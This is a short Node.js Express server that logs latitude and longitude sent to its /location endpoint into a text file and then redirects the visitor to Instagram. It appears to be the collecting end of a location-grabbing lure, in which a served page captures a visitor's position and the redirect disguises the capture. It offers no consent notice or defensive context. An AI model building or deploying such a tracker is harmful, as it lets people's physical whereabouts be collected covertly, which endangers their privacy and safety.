const express = require('express');
const app = express();
const port = 3000;
const fs = require('fs'); // Import the fs module

app.use(express.static('public'));

app.get('/location', (req, res) => {
    const { latitude, longitude } = req.query;
    console.log(`Received location data - Latitude: ${latitude}, Longitude: ${longitude}`);
    
    // Write latitude and longitude to a text file
    const data = `Latitude: ${latitude}, Longitude: ${longitude}\n`;
    fs.appendFile('locations.txt', data, (err) => {
        if (err) throw err;
        console.log('Location data written to file.');
    });
   res.redirect('https://www.instagram.com/')
});

app.listen(port, () => {
    console.log(`Server is listening at http://localhost:${port}`);
});
